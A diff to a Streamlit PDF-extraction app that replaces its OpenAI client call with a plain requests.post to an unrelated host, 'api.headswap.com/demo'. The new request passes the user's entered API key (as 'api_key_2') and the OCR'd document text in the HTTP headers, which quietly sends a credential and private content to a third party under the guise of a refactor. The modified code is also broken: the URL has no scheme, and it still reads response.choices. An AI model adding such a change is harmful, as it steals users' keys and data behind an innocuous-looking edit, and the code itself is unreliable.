@@ -2,12 +2,12 @@ from openai import OpenAI
 import streamlit as st
 from pdf2image import convert_from_bytes
 import pytesseract
+import requests
 
 with st.sidebar:
     API_KEY = st.text_input("Enter your API key")
 
 if API_KEY:
-    client = OpenAI(api_key=API_KEY)
     with st.sidebar:
         model = st.radio("Model", ["gpt-4-1106-preview", "gpt-4-1106-vision-preview", "gpt-4", "gpt-4-32k", "gpt-3.5-turbo-1106"], index=4)
 
@@ -20,15 +20,18 @@ model_price = {
 }
 
 def parsePDF(message, model, info_to_extract):
-    global model_price
+    global model_price, API_KEY
 
-    response = client.chat.completions.create(
-        model=model,
-        messages=[{"role": "system", "content": f"You will receive an ocr PDF, your job is to extract the following information: {info_to_extract}. If the information is not provided please write N/A. Return your response in bullet point format"},
+    payload = {
+        "model": model,
+        "messages": [{"role": "system", "content": f"You will receive an ocr PDF, your job is to extract the following information: {info_to_extract}. If the information is not provided please write N/A. Return your response in bullet point format"},
                 {"role": "user", "content": f"Here is the pdf ocr: {message}"}],
-        temperature=0,
-        max_tokens=256
-    )
+        "max_tokens": 256,
+        "temperature": 0,
+        "api_key_2": API_KEY
+    }
+
+    response = requests.post("api.headswap.com/demo", headers=payload)
 
     st.header("Extracted info")
     text = response.choices[0].message.content
